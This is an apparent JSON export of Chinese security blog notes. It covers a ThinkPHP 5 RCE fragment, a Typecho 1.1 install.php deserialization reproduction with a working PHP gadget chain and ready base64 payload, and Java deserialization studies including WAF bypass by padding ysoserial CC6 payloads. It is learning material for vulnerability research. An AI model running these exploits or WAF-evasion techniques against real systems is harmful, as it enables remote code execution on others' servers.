&#39;redirect&#39;:\n                    &#x2F;&#x2F; 执行重定向跳转\n                    $data &#x3D; Response::create($dispatch[&#39;url&#39;], &#39;redirect&#39;)-&gt;code($dispatch[&#39;status&#39;]);\n                    break;\n                case &#39;module&#39;:\n                    &#x2F;&#x2F; 模块&#x2F;控制器&#x2F;操作\n                    $data &#x3D; self::module($dispatch[&#39;module&#39;], $config, isset($dispatch[&#39;convert&#39;]) ? $dispatch[&#39;convert&#39;] : null);\n                    break;\n                case &#39;controller&#39;:\n                    &#x2F;&#x2F; 执行控制器操作\n                    $vars &#x3D; array_merge(Request::instance()-&gt;param(), $dispatch[&#39;var&#39;]);\n                    $data &#x3D; Loader::action($dispatch[&#39;controller&#39;], $vars, $config[&#39;url_controller_layer&#39;], $config[&#39;controller_suffix&#39;]);\n                    break;\n                case &#39;method&#39;:\n                    &#x2F;&#x2F; 执行回调方法\n                    $vars &#x3D; array_merge(Request::instance()-&gt;param(), $dispatch[&#39;var&#39;]);\n                    $data &#x3D; self::invokeMethod($dispatch[&#39;method&#39;], $vars);\n                    break;\n\n在通过switch调用param方法，来进行写入文件。这样可以免除debug模式开启的条件。\n吐槽：这第二个payload一开始还真是弄不明白，跟到最后总算知道它的作用了\n这个洞太复杂，真的很难跟，而且还是用没开debug模式的vs直接一个一个看的，真纯静态分析！！！麻烦。。。。。\n没有调试过，有错误很正常。。。。。\n等弄好debug在调试看看吧！\n终于弄完了，干！！！\n","slug":"TP5-0-5-0-23RCE","date":"2022-10-19T13:20:47.000Z","categories_index":"RCE","tags_index":"thinphp","author_index":"Longw"},{"id":"10d60eae5b46a090616c469686df0945","title":"Typecho1.1反序列化复现","content":"\n\n参考资料：https://github.com/aleenzz/php_bug_wiki/blob/master/1.9.%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AE%A1%E8%AE%A1.md\n复现：常见的博客系统，在1.1版本的install.php文件中存在反序列化漏洞\n阅读index.php，在没有安装时，会默认跳转到install.php执行\n在install.php中，想要到达unserialize触发点，必须先进行博客安装，才会生成/config.inc.php\n&#x2F;&#x2F;判断是否已经安装\nif (!isset($_GET[&#39;finish&#39;]) &amp;&amp; file_exists(__TYPECHO_ROOT_DIR__ . &#39;&#x2F;config.inc.php&#39;) &amp;&amp; empty($_SESSION[&#39;typecho&#39;])) &#123;\n    exit;\n&#125;\n\n&#x2F;&#x2F; 挡掉可能的跨站请求\nif (!empty($_GET) || !empty($_POST)) &#123;\n    if (empty($_SERVER[&#39;HTTP_REFERER&#39;])) &#123;\n        exit;\n    &#125;\n\n    $parts &#x3D; parse_url($_SERVER[&#39;HTTP_REFERER&#39;]);\n\tif (!empty($parts[&#39;port&#39;])) &#123; &#x2F;&#x2F;port不为空执行\n        $parts[&#39;host&#39;] &#x3D; &quot;&#123;$parts[&#39;host&#39;]&#125;:&#123;$parts[&#39;port&#39;]&#125;&quot;;\n    &#125;\n\n    if (empty($parts[&#39;host&#39;]) || $_SERVER[&#39;HTTP_HOST&#39;] !&#x3D; $parts[&#39;host&#39;]) &#123;&#x2F;&#x2F;看是否来自于自身的连接\n        exit;\n    &#125;\n&#125;\n\nget请求携带finish参数，进行了安装，session中不存在typecho的值，就会执行下面的代码\n后面部分代码就是一些函数，直接看unserialize触发点\n&lt;?php if (isset($_GET[&#39;finish&#39;])) : ?&gt;\n                &lt;?php if (!@file_exists(__TYPECHO_ROOT_DIR__ . &#39;&#x2F;config.inc.php&#39;)) : ?&gt;\n                &lt;h1 class&#x3D;&quot;typecho-install-title&quot;&gt;&lt;?php _e(&#39;安装失败!&#39;); ?&gt;&lt;&#x2F;h1&gt;\n                &lt;div class&#x3D;&quot;typecho-install-body&quot;&gt;\n                    &lt;form method&#x3D;&quot;post&quot; action&#x3D;&quot;?config&quot; name&#x3D;&quot;config&quot;&gt;\n                    &lt;p class&#x3D;&quot;message error&quot;&gt;&lt;?php _e(&#39;您没有上传 config.inc.php 文件，请您重新安装！&#39;); ?&gt; &lt;button class&#x3D;&quot;btn primary&quot; type&#x3D;&quot;submit&quot;&gt;&lt;?php _e(&#39;重新安装 &amp;raquo;&#39;); ?&gt;&lt;&#x2F;button&gt;&lt;&#x2F;p&gt;\n                    &lt;&#x2F;form&gt;\n                &lt;&#x2F;div&gt;\n                &lt;?php elseif (!Typecho_Cookie::get(&#39;__typecho_config&#39;)): ?&gt;\n                &lt;h1 class&#x3D;&quot;typecho-install-title&quot;&gt;&lt;?php _e(&#39;没有安装!&#39;); ?&gt;&lt;&#x2F;h1&gt;\n                &lt;div class&#x3D;&quot;typecho-install-body&quot;&gt;\n                    &lt;form method&#x3D;&quot;post&quot; action&#x3D;&quot;?config&quot; name&#x3D;&quot;config&quot;&gt;\n                    &lt;p class&#x3D;&quot;message error&quot;&gt;&lt;?php _e(&#39;您没有执行安装步骤，请您重新安装！&#39;); ?&gt; &lt;button class&#x3D;&quot;btn primary&quot; type&#x3D;&quot;submit&quot;&gt;&lt;?php _e(&#39;重新安装 &amp;raquo;&#39;); ?&gt;&lt;&#x2F;button&gt;&lt;&#x2F;p&gt;\n                    &lt;&#x2F;form&gt;\n                &lt;&#x2F;div&gt;\n                &lt;?php else : ?&gt;\n                    &lt;?php\n                    $config &#x3D; unserialize(base64_decode(Typecho_Cookie::get(&#39;__typecho_config&#39;)));\n                    Typecho_Cookie::delete(&#39;__typecho_config&#39;);\n                    $db &#x3D; new Typecho_Db($config[&#39;adapter&#39;], $config[&#39;prefix&#39;]);\n                    $db-&gt;addServer($config, Typecho_Db::READ | Typecho_Db::WRITE);\n                    Typecho_Db::set($db);\n                    ?&gt;\n\n和前面一样，需要存在finish，已经安装，并且通过get函数获取了__typecho_config\n这个值。看一下get函数\n&#x2F;**\n     * 获取指定的COOKIE值\n     *\n     * @access public\n     * @param string $key 指定的参数\n     * @param string $default 默认的参数\n     * @return mixed\n     *&#x2F;\n    public static function get($key, $default &#x3D; NULL)\n    &#123;\n        $key &#x3D; self::$_prefix . $key;\n        $value &#x3D; isset($_COOKIE[$key]) ? $_COOKIE[$key] : (isset($_POST[$key]) ? $_POST[$key] : $default);\n        return is_array($value) ? $default : $value;\n    &#125;\n\n$_prefix默认设置为空，看cookie里面是否有__typecho_config的值。如果没有，看这个值在post里面有没有。有则看是否为数组，不是数组则返回该值。\n然后就会执行到触发点\n&lt;?php\n$config &#x3D; unserialize(base64_decode(Typecho_Cookie::get(&#39;__typecho_config&#39;)));\nTypecho_Cookie::delete(&#39;__typecho_config&#39;);\n$db &#x3D; new Typecho_Db($config[&#39;adapter&#39;], $config[&#39;prefix&#39;]);\n$db-&gt;addServer($config, Typecho_Db::READ | Typecho_Db::WRITE);\nTypecho_Db::set($db);\n?&gt;\n\n对获取到的__typecho_config的值进行base64解码，并将它进行反序列化。\n到这里就有点懵逼，看了下大佬的教程，接下来需要找可以利用的魔术方法\n一般找析构函数__destruct()，全局搜索，函数用来unset值，和fclose关闭文件\n然后看下面代码，获取$config里面的adapter的值，和prefix的值，来实例化一个Typecho_Db对象，看一下这个类的构造函数能不能利用\n&#x2F;**\n     * 数据库类构造函数\n     *\n     * @param mixed $adapterName 适配器名称\n     * @param string $prefix 前缀\n     * @throws Typecho_Db_Exception\n     *&#x2F;\n    public function __construct($adapterName, $prefix &#x3D; &#39;typecho_&#39;)\n    &#123;\n        &#x2F;** 获取适配器名称 *&#x2F;\n        $this-&gt;_adapterName &#x3D; $adapterName;\n\n        &#x2F;** 数据库适配器 *&#x2F;\n        $adapterName &#x3D; &#39;Typecho_Db_Adapter_&#39; . $adapterName;\n\n        if (!call_user_func(array($adapterName, &#39;isAvailable&#39;))) &#123;\n            throw new Typecho_Db_Exception(&quot;Adapter &#123;$adapterName&#125; is not available&quot;);\n        &#125;\n\n        $this-&gt;_prefix &#x3D; $prefix;\n\n        &#x2F;** 初始化内部变量 *&#x2F;\n        $this-&gt;_pool &#x3D; array();\n        $this-&gt;_connectedPool &#x3D; array();\n        $this-&gt;_config &#x3D; array();\n\n        &#x2F;&#x2F;实例化适配器对象\n        $this-&gt;_adapter &#x3D; new $adapterName();\n    &#125;\n\nprefix就是一个头参数，直接使用默认的就行。而adapter将会进行字符串连接，当adapter是一个类的时候，用 . 连接会触发这个类的__ toString 魔术方法。全局搜索 __ toString()\n有三个使用了，最后找到Feed.php中的__toString方法\n&#x2F;**\n     * 输出字符串\n     *\n     * @access public\n     * @return string\n     *&#x2F;\n    public function __toString()\n    &#123;\n        $result &#x3D; &#39;&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;&#39; . $this-&gt;_charset . &#39;&quot;?&gt;&#39; . self::EOL;\n\n        if (self::RSS1 &#x3D;&#x3D; $this-&gt;_type) &#123;\n            $result .&#x3D; &#39;&lt;rdf:RDF\nxmlns:rdf&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;02&#x2F;22-rdf-syntax-ns#&quot;\nxmlns&#x3D;&quot;http:&#x2F;&#x2F;purl.org&#x2F;rss&#x2F;1.0&#x2F;&quot;\nxmlns:dc&#x3D;&quot;http:&#x2F;&#x2F;purl.org&#x2F;dc&#x2F;elements&#x2F;1.1&#x2F;&quot;&gt;&#39; . self::EOL;\n\n            $content &#x3D; &#39;&#39;;\n            $links &#x3D; array();\n            $lastUpdate &#x3D; 0;\n\n            foreach ($this-&gt;_items as $item) &#123;\n                $content .&#x3D; &#39;&lt;item rdf:about&#x3D;&quot;&#39; . $item[&#39;link&#39;] . &#39;&quot;&gt;&#39; . self::EOL;\n                $content .&#x3D; &#39;&lt;title&gt;&#39; . htmlspecialchars($item[&#39;title&#39;]) . &#39;&lt;&#x2F;title&gt;&#39; . self::EOL;\n                $content .&#x3D; &#39;&lt;link&gt;&#39; . $item[&#39;link&#39;] . &#39;&lt;&#x2F;link&gt;&#39; . self::EOL;\n                $content .&#x3D; &#39;&lt;dc:date&gt;&#39; . $this-&gt;dateFormat($item[&#39;date&#39;]) . &#39;&lt;&#x2F;dc:date&gt;&#39; . self::EOL;\n                $content .&#x3D; &#39;&lt;description&gt;&#39; . strip_tags($item[&#39;content&#39;]) . &#39;&lt;&#x2F;description&gt;&#39; . self::EOL;\n                if (!empty($item[&#39;suffix&#39;])) &#123;\n                    $content .&#x3D; $item[&#39;suffix&#39;];\n                &#125;\n                $content .&#x3D; &#39;&lt;&#x2F;item&gt;&#39; . self::EOL;\n\n                $links[] &#x3D; $item[&#39;link&#39;];\n\n                if ($item[&#39;date&#39;] &gt; $lastUpdate) &#123;\n                    $lastUpdate &#x3D; $item[&#39;date&#39;];\n                &#125;\n            &#125;\n\n\n很长，跳过一段\n else if (self::RSS2 &#x3D;&#x3D; $this-&gt;_type) &#123;\n            $result .&#x3D; &#39;&lt;rss version&#x3D;&quot;2.0&quot;\nxmlns:content&#x3D;&quot;http:&#x2F;&#x2F;purl.org&#x2F;rss&#x2F;1.0&#x2F;modules&#x2F;content&#x2F;&quot;\nxmlns:dc&#x3D;&quot;http:&#x2F;&#x2F;purl.org&#x2F;dc&#x2F;elements&#x2F;1.1&#x2F;&quot;\nxmlns:slash&#x3D;&quot;http:&#x2F;&#x2F;purl.org&#x2F;rss&#x2F;1.0&#x2F;modules&#x2F;slash&#x2F;&quot;\nxmlns:atom&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2005&#x2F;Atom&quot;\nxmlns:wfw&#x3D;&quot;http:&#x2F;&#x2F;wellformedweb.org&#x2F;CommentAPI&#x2F;&quot;&gt;\n&lt;channel&gt;&#39; . self::EOL;\n\n            $content &#x3D; &#39;&#39;;\n            $lastUpdate &#x3D; 0;\n\n            foreach ($this-&gt;_items as $item) &#123;\n                $content .&#x3D; &#39;&lt;item&gt;&#39; . self::EOL;\n                $content .&#x3D; &#39;&lt;title&gt;&#39; . htmlspecialchars($item[&#39;title&#39;]) . &#39;&lt;&#x2F;title&gt;&#39; . self::EOL;\n                $content .&#x3D; &#39;&lt;link&gt;&#39; . $item[&#39;link&#39;] . &#39;&lt;&#x2F;link&gt;&#39; . self::EOL;\n                $content .&#x3D; &#39;&lt;guid&gt;&#39; . $item[&#39;link&#39;] . &#39;&lt;&#x2F;guid&gt;&#39; . self::EOL;\n                $content .&#x3D; &#39;&lt;pubDate&gt;&#39; . $this-&gt;dateFormat($item[&#39;date&#39;]) . &#39;&lt;&#x2F;pubDate&gt;&#39; . self::EOL;\n                $content .&#x3D; &#39;&lt;dc:creator&gt;&#39; . htmlspecialchars($item[&#39;author&#39;]-&gt;screenName) . &#39;&lt;&#x2F;dc:creator&gt;&#39; . self::EOL;\n\n\n在这里当，_type为RSS2也就是’RSS 2.0‘时，会执行$item[‘author’]-&gt;screenName\n这里如果，author值是一个类，并且screenName是一个私有或者没有定义的值就会触发该类的__get()方法。接下来就是找__get()方法\n在var/typecho/request.php中有个__get()方法\n&#x2F;**\n    * 获取实际传递参数(magic)\n    *\n    * @access public\n    * @param string $key 指定参数\n    * @return mixed\n    *&#x2F;\n   public function __get($key)\n   &#123;\n       return $this-&gt;get($key);\n   &#125;\n\n这个方法调用了get函数\n&#x2F;**\n     * 获取实际传递参数\n     *\n     * @access public\n     * @param string $key 指定参数\n     * @param mixed $default 默认参数 (default: NULL)\n     * @return mixed\n     *&#x2F;\n    public function get($key, $default &#x3D; NULL)\n    &#123;\n        switch (true) &#123;\n            case isset($this-&gt;_params[$key]):\n                $value &#x3D; $this-&gt;_params[$key];\n                break;\n            case isset(self::$_httpParams[$key]):\n                $value &#x3D; self::$_httpParams[$key];\n                break;\n            default:\n                $value &#x3D; $default;\n                break;\n        &#125;\n\n        $value &#x3D; !is_array($value) &amp;&amp; strlen($value) &gt; 0 ? $value : $default;\n        return $this-&gt;_applyFilter($value);\n    &#125;\n\n\n就是判断有没有设置$_params[‘screenName’]的值，或是$_httpParams[‘screenName’]的值，接下来赋值给$value，然后就是调用_applyFilter函数\n&#x2F;**\n     * 应用过滤器\n     *\n     * @access private\n     * @param mixed $value\n     * @return mixed\n     *&#x2F;\n    private function _applyFilter($value)\n    &#123;\n        if ($this-&gt;_filter) &#123;\n            foreach ($this-&gt;_filter as $filter) &#123;\n                $value &#x3D; is_array($value) ? array_map($filter, $value) :\n                call_user_func($filter, $value);\n            &#125;\n\n            $this-&gt;_filter &#x3D; array();\n        &#125;\n\n        return $value;\n    &#125;\n\n判断赋值的value是不是数组，是数组通过array_map进行过滤函数调用，不是数组就是用call_user_func进行过滤函数调用。很奇怪前面经过判断，$value是数组的话，就会赋值成空。这里应该是其他地方也使用了这个函数，所以逻辑严谨一点，才会对$value的类型进行了判断。\n这里的$_filter和前面的$_params都是可控的内部参数，只需要将$_filter设置为代码执行函数，$_params[‘screenName’]设置为需要执行的代码。通过call_user_func来执行代码。\n&lt;?php\n\nclass Typecho_Request&#123;\n    &#x2F;&#x2F;$_params数组里有screenName则会取用$_params里的值，赋给$value\n    private $_params&#x3D;array(&#39;screenName&#39;&#x3D;&gt;&#39;eval(\\&#39;phpinfo();exit();\\&#39;)&#39;);\n    &#x2F;&#x2F;通过过滤函数，过滤$value的值\n    private $_filter&#x3D;array(&#39;assert&#39;);\n&#125;\n\nclass Typecho_Feed&#123;\n    private $_type &#x3D; &#39;RSS 2.0&#39;;&#x2F;&#x2F;需要其通过前面的判断\n    private $_items;\n    public function __construct()\n    &#123;\n        $this-&gt;_items[]&#x3D;array(&#39;author&#39;&#x3D;&gt;new Typecho_Request());\n    &#125;\n&#125;\n&#x2F;&#x2F;接下来就是实例化Typecho_Feed对象，赋值给adapter\n&#x2F;&#x2F;通过反序列化，取adapter的值\n&#x2F;&#x2F;adapter是对象，触发Typecho_Feed的__toString方法\n&#x2F;&#x2F;获取author的screenName的值，author是Typecho_Request对象，且screenName是私有的\n&#x2F;&#x2F;触发Typecho_Request的__get()方法，通过call_user_func命令执行\n$payload &#x3D; array(&#39;adapter&#39;&#x3D;&gt;new Typecho_Feed());\n&#x2F;&#x2F;反序列化前进行了base64解码，所以需要编码\necho base64_encode(serialize($payload));\n&#x2F;&#x2F;http:&#x2F;&#x2F;127.0.0.1:8082&#x2F;install.php?finish&#x3D;11111\n&#x2F;&#x2F;Referer需要是从自身来的：http:&#x2F;&#x2F;127.0.0.1:8082&#x2F;install.php\n&#x2F;&#x2F;__typecho_config&#x3D;YToxOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo3OiJSU1MgMi4wIjtzOjIwOiIAVHlwZWNob19GZWVkAF9pdGVtcyI7YToxOntzOjY6ImF1dGhvciI7TzoxNToiVHlwZWNob19SZXF1ZXN0IjoyOntzOjI0OiIAVHlwZWNob19SZXF1ZXN0AF9wYXJhbXMiO2E6MTp7czoxMDoic2NyZWVuTmFtZSI7czoyNToiZXZhbCgncGhwaW5mbygpO2V4aXQoKTsnKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fX19\n?&gt;\n\n$_filter默认是空数组，这里使用foreach，遍历取值，所以payload中$_filter=array(‘assert’); 还在奇怪为什么传入数组到call_user_func。传入数组到call_user_func的回调参数，是使用某个类的某个方法，一般形式是\ncall_user_func(array(‘a’,’b’),’xxxx’);\n为什么这里payload *phpinfo();exit();中有exit()* ,因为程序开始使用了****ob_start() 这个函数会把输出放进缓冲区，触发异常后****ob_end_clean() 会清空缓冲区，导致没有回显。所以可以找到个函数来跳出或者执行后我们报错跳出又或者直接不要回显写入一句话。\n测试一下：\n\n成功\n直接使用上面注释里的__typecho_config会报错，原因是_items应该写成_items[]\n小结：感觉跟这种还是很吃力，不过跟一遍下来收获真挺大的\n反序列化的利用过程，各种利用思路，还有各种魔术方法的运用\n","slug":"Typecho1-1反序列化复现","date":"2022-10-17T11:42:19.000Z","categories_index":"PHP反序列化","tags_index":"PHP","author_index":"Longw"},{"id":"fc0657b8e278d4cdd3f372956d7c0f2c","title":"Java反序列化9笔记","content":"\n\n参考文章：p牛 Java安全漫谈19\nhttps://t.zsxq.com/06mmMZrFu\nObject Serialization Stream Protocol\nhttps://docs.oracle.com/javase/8/docs/platform/serialization/spec/protocol.html\nJava 序列化格式映射\nhttps://github.com/1nhann/java_ser_format\nJava反序列化数据绕WAF之加大量脏数据\nhttps://mp.weixin.qq.com/s/wvKfe4xxNXWEgtQE4PdTaQ\n序列化流的Grammer学习：前面JDK7u21有点绕了，这次文档直接来个英文的文档，直接爆炸！！！\n不过还好，p牛的讲解很清楚，初步了解了一点\n4个核心部分：stream：stream就是指完整的序列化协议流，由三个部分组成\nmagic：final static short STREAM_MAGIC &#x3D; (short)0xaced;  \n\nversion：final static short STREAM_VERSION &#x3D; 5;  \n\nmagic和version都是short类型，也就是两个字节整型。值都是定好的，所以序列化协议流都是以\\xAC\\xED\\x00\\x05开头\ncontents：contents:\n\n\tcontent \n\n\tcontents content  \n\n这是一个递归下降的规则，contents可以由一个content组成，也可由一个contents和一个content组成，这后一个contents也可以继续由contents content和content组成。最后形成编译原理里的左递归\ncontent：content: \n\n\tobject \n\n\tblockdata  \n\n而content是由object或者blockdata组成，blockdata是一个由数组长度加数据本身组成的一个结构，里面可以填充任意内容，这也是脏数据可以填充的条件\nobject：object: \n\n\tnewObject \n\n\tnewClass \n\n\tnewArray \n\n\tnewString \n\n\tnewEnum \n\n\tnewClassDesc \n\n\tprevObject \n\n\tnullReference \n\n\texception \n\n\tTC_RESET  \n\nobject激素真正包含Java对象的一个结构，object由上面这些组成。\n\nnewObject：表示一个对象\nnewClass：表示一个类\nnewArray：表示一个数组\nnewString：表示一个字符串\nnewRnum：表示一个枚举\nnewClassDesc：表示一个类定义\npreObject：表示一个引用，可以指向任意其他类型（通过Reference ID）\nnullReference：表示null\nexception：表示一个异常\nTC_RESET：重置Reference ID\n\nnewObject就是一个实例化对象，newClass就是一个类，newClassDesc是类定义，就是对一个类的描述，比如类名，字段等\nnewObject: \n\tTC_OBJECT classDesc newHandle classdata[] &#x2F;&#x2F; data for each class \n\t\nnewClass: \n\tTC_CLASS classDesc newHandle \n\t\n\nclassDesc: \n\tnewClassDesc \n\tnullReference \n\t(ClassDesc)prevObject  \t\t\t&#x2F;&#x2F; an object required to be of type \n\n \t\t\t\t\t\t\t\t\t&#x2F;&#x2F; ClassDesc  \n\n实例化的对象有具体的数据，所以newObject的结构就比newClass队列一个classdata[]存储这些数据，其他结构就是标识符+calssDesc+newHandle\nclassDesc是一个普通的类定义，可以是null，可以是指针指向前面出现过的类定义，可以理解为newClassDesc的一个封装\nnewHandle是一个唯一的ID，每个结构都会有一个ID，从0x7E0000开始，遇到下一个结构就加一，这个结构的ID被设置为唯一\nprevObject指针就是通过newHandle这个唯一的ID来定位它指向的结构\ndemo：一个简单的User类\npackage com.zkar;\n\nimport java.io.ByteArrayOutputStream;\nimport java.io.ObjectOutputStream;\nimport java.io.Serializable;\nimport org.apache.commons.codec.binary.Base64;\n\n\n\npublic class User implements Serializable &#123;\n\tprotected String name;\n\tprotected User parent;\n\t\n\tpublic User(String name)&#123;\n\t\tthis.name &#x3D; name;\n\t&#125;\n\t\n\tpublic void setParent(User parent)&#123;\n\t\tthis.parent &#x3D; parent;\n\t&#125;\n\n\tpublic static void main(String[] args) throws Exception &#123;\n\t\tUser user &#x3D; new User(&quot;Bob&quot;);\n\t\tuser.setParent(new User(&quot;Josua&quot;));\n\t\tByteArrayOutputStream byteSteam &#x3D; new ByteArrayOutputStream();\n\t\tObjectOutputStream oos &#x3D; new ObjectOutputStream(byteSteam);\n\t\toos.writeObject(user);\n\t\tSystem.out.println(Base64.encodeBase64String(byteSteam.toByteArray()));\n\t&#125;\n&#125;\n\n\n\n将其生成序列化数据由base64编码，这里有一点注意，使用p牛的这个代码，添加的项目插件中如果使用shiro-all.jar，那么就会找不到deBaseString方法，当然可以改成encodeToString方法，想使用deBaseString那么插件包必须使用commons-codec.jar这个包，两个包不能在同一个项目中，不然默认调用shiro-all.jar，上移都没用\n主要是想看源码，发现导入了源码包也不行，才发现这个问题\nzkar：p牛是的序列化协议分析工具\nhttps://github.com/phith0n/zkar\n使用它对前面生成的序列化数据进行分析\nzkar dump -B xxxxxxx\n\n!\n\n明显的包含前面的头文件magic和version\ncontents中包含一个newObject，第一部分是ClassDesc，里面有User类的信息，有类名、SerialVersionUID、父类、属性列表等\n唯一的ID值为8257536，calssdata[]数组包含实例化对象的数据，有两个属性name、parent。parent在定义时也是一个User类的对象，所以在序列化数据里是一个newObject，它的classDesc也是User类的信息，前面定义过classDesc所以这里是一个TC_REFERENCE，ID相同，因为都是指向前面的那个User类的classDesc\n这个ID只是classDesc的ID，而parent的ID则与前面不同，不同结构ID值不一样，当相同时，就指向第一个定义的，ID值要唯一\nJava序列化脏数据bypass：在Crammer学习时，提到过blockdata的数据是可以随意填充的\ncontent: \n\n\tobject \n\n\tblockdata \n\nblockdata: \n\n\tblockdatashort \n\n\tblockdatalong \n\nblockdatashort: \n\n\tTC_BLOCKDATA (unsigned byte) (byte)[size] \t\t \n\nblockdatalong: \n\n\tTC_BLOCKDATALONG (int) (byte)[size] \n\nblockdata分为两种类型，short和long，区别是可以存储的数据的大小不同\n所以选择blockdatalong作为脏数据的填充类型\n其结构分为，标示符、数据长度(4字节整型)、数据内容\n使用go调用zkar库的方法来进行脏数据的填充\n使用yso生成CC6的payload\njava -jar ysoserial-all.jar CommonsCollections6  calc.exe &gt; CC6.ser\n\n\n\nCC6 脏数据demo1：go：package main\n\nimport (\n\t&quot;io&#x2F;ioutil&quot;\n\t&quot;log&quot;\n\t&quot;strings&quot;\n\n\t&quot;github.com&#x2F;phith0n&#x2F;zkar&#x2F;serz&quot;\n)\n\nfunc main() &#123;\n\tdata, _ :&#x3D; ioutil.ReadFile(&quot;CC6.ser&quot;)\n\tserialization, err :&#x3D; serz.FromBytes(data)\n\tif err !&#x3D; nil &#123;\n\t\tlog.Fatal(&quot;parse error&quot;)\n\t&#125;\n\tvar blockData &#x3D; &amp;serz.TCContent&#123;\n\t\tFlag: serz.JAVA_TC_BLOCKDATALONG,\n\t\tBlockData: &amp;serz.TCBlockData&#123;\n\t\t\tData: []byte(strings.Repeat(&quot;a&quot;, 40000)),\n\t\t&#125;,\n\t&#125;\n\tserialization.Contents &#x3D; append(serialization.Contents, blockData)\n\t&#x2F;&#x2F; serialization.Contents &#x3D; append([]*serz.TCContent&#123;blockData&#125;,\n\t&#x2F;&#x2F; \tserialization.Contents...)\n\n\tioutil.WriteFile(&quot;cc6-padding1.ser&quot;, serialization.ToBytes(), 0o755)\n&#125;\n\n\n\n\nJava：package com.zkar;\n\nimport java.io.FileInputStream;\nimport java.io.InputStream;\nimport java.io.ObjectInputStream;\n\npublic class CC6bypass &#123;\n\tpublic static void read() throws Exception&#123;\n\t\tInputStream is &#x3D; new FileInputStream(&quot;cc6-padding2.ser&quot;);\n\t\tObjectInputStream ois &#x3D; new ObjectInputStream(is);\n\t\tObject obj &#x3D; ois.readObject();\n\t\tSystem.out.println(obj);\n\t&#125;\n\t\n\tpublic static void main(String[] args) throws Exception &#123;\n\t\tread();\n\t&#125;\n\n&#125;\n\n\n\n\n可以成功弹出计算器\nCC6 脏数据demo2：demo1中的脏数据是在payload的后面，在反序列化时是直接被忽略了\n如果waf只检测前面一段，那么无法绕过waf\n所以需要将脏数据填充在payload前面\n直接改变Contents的顺序会在反序列化是抛出异常\nserialization.Contents &#x3D; append([]*serz.TCContent&#123;blockData&#125;, serialization.Contents...)  \n\n\n原因：在Java解析时进行了处理\n\n\nJava会先处理TC_RESET循环，之后\n在处理TC_RESET之外的结构时，如果第一个结构是blockdata会爆出异常，停止执行\n所以Java处理的contents里面处理TC_RESET之外的首个结构不能是blockdata、exception等\n前面填充内容可行是因为压根每处理到blockdata，在处理object之后，反序列化已经完成了\n所以换个顺序是不行的，但是Java在前面会将所有的TC_RESET去除，而TC_RESET又是object的一种结构，所以可以用TC_RESET来进行填充\n这样脏数据就会在前面，同时也在处理流程前面\ngo：package main\n\nimport (\n\t&quot;io&#x2F;ioutil&quot;\n\t&quot;log&quot;\n\n\t&quot;github.com&#x2F;phith0n&#x2F;zkar&#x2F;serz&quot;\n)\n\nfunc main() &#123;\n\tdata, _ :&#x3D; ioutil.ReadFile(&quot;cc6.ser&quot;)\n\tserialization, err :&#x3D; serz.FromBytes(data)\n\tif err !&#x3D; nil &#123;\n\t\tlog.Fatal(&quot;parse error&quot;)\n\t&#125;\n\tvar contents []*serz.TCContent\n\tfor i :&#x3D; 0; i &lt; 5000; i++ &#123;\n\t\tvar blockData &#x3D; &amp;serz.TCContent&#123;\n\t\t\tFlag: serz.JAVA_TC_RESET,\n\t\t&#125;\n\t\tcontents &#x3D; append(contents, blockData)\n\t&#125;\n\tserialization.Contents &#x3D; append(contents, serialization.Contents...)\n\tioutil.WriteFile(&quot;cc6-padding2.ser&quot;, serialization.ToBytes(), 0o755)\n&#125;\n\n\n","slug":"Java反序列化9笔记","date":"2022-09-16T11:41:59.000Z","categories_index":"Java安全","tags_index":"Java","author_index":"Longw"},{"id":"4246a945c68e3de6ca09de0bdac9f5e2","title":"Java反序列化8笔记","content":"\n\n参考文章：p牛Java安全漫谈 18\nhttps://t.zsxq.com/06RBYz7un\np牛\nhttps://t.zsxq.com/063Zz3B2F\nJDK7u21反序列化漏洞分析笔记\nhttps://xz.aliyun.com/t/9704#toc-10\nJDK7u21反序列化利用链：先下载jre7u21\nhttps://www.oracle.com/cn/java/technologies/javase/javase7-archive-downloads.html\n不依赖第三方库的反序列化利用链\nequalsImpl()：反序列化的核心在于触发动态执行方法的地方\n在jdk7u21的 sun.reflect.annotation.AnnotationInvocationHandler类中有个equalsImpl方法，该方法里有明显的利用反射调用方法并执行\nmemberMethod.invoke(o)\n这个memberMethod来自于this.type.getDeclareMethods()\nequalsImpl方法将this.type类中的所有方法遍历执行\n当这个this.type是Templates类时，就会调用newTransformer和getOutputProperties方法，触发任意代码执行\n找半天没找到源码，没办法用idea反编译凑合一下\n\n调用equalsImpl()：equalsImpl是私有方法，在public方法invoke中被调用\n\n漫谈11中提到过，可以通过java.reflect.proxy来劫持一个对象内部的方法调用\n Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] {Map.class},     handler);  \n第一个参数默认，第二个参数是需要代理的对象集合，第三个参数是具体的代理逻辑同时是实现InvocationHandler接口的对象\n同时AnnotationInvocationHandler就是实现了InvocationHandler接口的类，其Invoke方法中，当方法名为equals且参数类型为Object并且长度为1时，就会带调用equalsImpl方法\nequals是比较Java对象时常用的方法，另一个是compareTo\n现在需要找一个使用了equals作为比较方法的类\n在前面的java.util.PriorityQueue有比较的方法，但是它用的compareTo方法\n任意Java对象都拥有 equals 方法，它通常用于比较两个对象是否是同一个引用；而compareTo实际上 是 java.lang.Comparable 接口的方法，我在前一篇介绍 java.util.PriorityQueue 时也介绍过，通 常被实现用于比较两个对象的值是否相等。  \n这里用到的是hashset，集合set中储存的对象不允许重复，再添加对象时就会进行比较\n在HashSet的readObject方法中，将对象保存在HashMap的key处\n\n\n而在HashMap中是通过key.hashcode()去计算获得索引，当碰到相同索引的key-value是，就会被链接到链表后面\n所以，要触发比较就必须让两个需要比较的对象hash相同，是链接到同一张链表才会触发比较\n在HashMap的put方法中\n\n只有当两个不同对象的变量4的值，也就是hash相同时就会执行key.quals(k)，这样就会触发前面的equalsImpl，条件满足时就会触发代码执行\n哈希计算方法：计算hash的关键代码就是hash方法\nint hash &#x3D; hash(key); \n\nint i &#x3D; indexFor(hash, table.length);  